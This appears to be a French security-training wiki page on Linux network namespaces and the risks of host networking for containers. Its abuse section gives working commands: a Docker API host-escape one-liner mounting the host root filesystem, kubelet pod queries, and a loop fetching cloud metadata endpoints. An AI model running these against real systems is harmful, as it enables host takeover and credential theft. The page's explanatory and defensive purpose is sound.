# Espace de noms réseau

{{#include ../../../../../banners/hacktricks-training.md}}

## Aperçu

L'espace de noms réseau isole les ressources liées au réseau telles que les interfaces, les adresses IP, les tables de routage, l'état ARP/neighbor, les règles de pare-feu, les sockets, et le contenu de fichiers comme `/proc/net`. C'est pourquoi un container peut avoir ce qui ressemble à son propre `eth0`, ses propres routes locales et son propre loopback device sans posséder la pile réseau réelle de l'hôte.

D'un point de vue sécurité, cela importe parce que l'isolation réseau va bien au-delà du seul binding de ports. Un espace de noms réseau privé limite ce que le workload peut observer ou reconfigurer directement. Une fois que cet espace de noms est partagé avec l'hôte, le container peut soudainement gagner en visibilité sur les listeners de l'hôte, les host-local services et les points de contrôle réseau qui n'étaient pas destinés à être exposés à l'application.

## Fonctionnement

Un espace de noms réseau fraîchement créé commence avec un environnement réseau vide ou presque jusqu'à ce que des interfaces y soient attachées. Les container runtimes créent alors ou connectent des interfaces virtuelles, assignent des adresses et configurent des routes afin que le workload dispose de la connectivité attendue. Dans des déploiements basés sur des bridge, cela signifie généralement que le container voit une interface veth connectée à un bridge de l'hôte. Dans Kubernetes, les plugins CNI gèrent la configuration équivalente pour le Pod networking.

Cette architecture explique pourquoi `--network=host` ou `hostNetwork: true` représente un changement si radical. Au lieu de recevoir une pile réseau privée préparée, le workload rejoint la pile réelle de l'hôte.

## Laboratoire

Vous pouvez voir un espace de noms réseau presque vide avec :
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Et vous pouvez comparer les containers normaux et les containers host-networked avec :
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Le host-networked container n'a plus sa propre vue isolée des sockets et des interfaces. Ce changement à lui seul est déjà significatif, avant même de s'interroger sur les capacités du processus.

## Utilisation à l'exécution

Docker et Podman créent normalement un network namespace privé pour chaque container sauf configuration contraire. Kubernetes donne généralement à chaque Pod son propre network namespace, partagé par les containers à l'intérieur de ce Pod mais séparé du host. Les systèmes Incus/LXC fournissent aussi une isolation riche basée sur le network namespace, souvent avec une plus grande variété de configurations de réseau virtuel.

Le principe courant est que le networking privé est la frontière d'isolation par défaut, tandis que le host networking est une dérogation explicite à cette frontière.

## Mauvaises configurations

La mauvaise configuration la plus importante est simplement de partager le host network namespace. Cela se fait parfois pour la performance, le monitoring bas-niveau, ou la commodité, mais cela supprime l'une des frontières les plus nettes disponibles pour les containers. Les host-local listeners deviennent accessibles de manière plus directe, les services bindés sur localhost peuvent devenir accessibles, et des capabilities telles que `CAP_NET_ADMIN` ou `CAP_NET_RAW` deviennent beaucoup plus dangereuses parce que les opérations qu'elles autorisent s'appliquent désormais à l'environnement réseau du host lui-même.

Un autre problème est l'octroi excessif de capabilities liées au réseau même lorsque le network namespace est privé. Un namespace privé aide, mais il ne rend pas les raw sockets ou le contrôle réseau avancé inoffensifs.

## Abus

Dans des environnements faiblement isolés, des attaquants peuvent inspecter les services à l'écoute du host, atteindre des management endpoints bindés uniquement sur loopback, sniffer ou interférer avec le trafic selon les capabilities et l'environnement exacts, ou reconfigurer le routage et l'état du firewall si `CAP_NET_ADMIN` est présent. Dans un cluster, cela peut aussi faciliter le mouvement latéral et la reconnaissance du control-plane.

Si vous suspectez du host networking, commencez par confirmer que les interfaces et les listeners visibles appartiennent au host plutôt qu'à un réseau de container isolé :
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Les services accessibles uniquement via loopback sont souvent la première découverte intéressante :
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Si des network capabilities sont présentes, testez si le workload peut inspecter ou modifier la pile visible :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Dans les environnements de cluster ou cloud, le réseau de l'hôte justifie également une reconnaissance locale rapide des metadata et des services adjacents au control-plane :
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Exemple complet: Host Networking + Local Runtime / Kubelet Access

Host networking ne fournit pas automatiquement le host root, mais il expose souvent des services qui sont intentionnellement accessibles uniquement depuis le node lui-même. Si l'un de ces services est faiblement protégé, host networking devient une voie directe de privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet sur localhost :
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact :

- compromission directe de l'hôte si une API runtime locale est exposée sans protection adéquate
- reconnaissance du cluster ou mouvement latéral si kubelet ou des agents locaux sont accessibles
- manipulation du trafic ou déni de service lorsqu'il est combiné avec `CAP_NET_ADMIN`

## Vérifications

Le but de ces vérifications est de déterminer si le processus dispose d'une pile réseau privée, quelles routes et quels listeners sont visibles, et si la vue réseau ressemble déjà à celle de l'hôte avant même que vous ne testiez les capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Ce qui est intéressant ici :

- Si l'identifiant de l'espace de noms ou l'ensemble d'interfaces visibles ressemble à l'hôte, le réseau de l'hôte peut déjà être utilisé.
- `ss -lntup` est particulièrement utile car il révèle les sockets en écoute uniquement sur loopback et les points de terminaison de gestion locaux.
- Les routes, les noms d'interface et le contexte du pare-feu prennent beaucoup plus d'importance si `CAP_NET_ADMIN` ou `CAP_NET_RAW` est présent.

Lors de l'examen d'un container, évaluez toujours l'espace de noms réseau conjointement avec l'ensemble des capabilities. Le réseau de l'hôte associé à de fortes capabilities réseau représente une posture très différente du réseau en bridge associé à un jeu de capabilities par défaut restreint.
{{#include ../../../../../banners/hacktricks-training.md}}
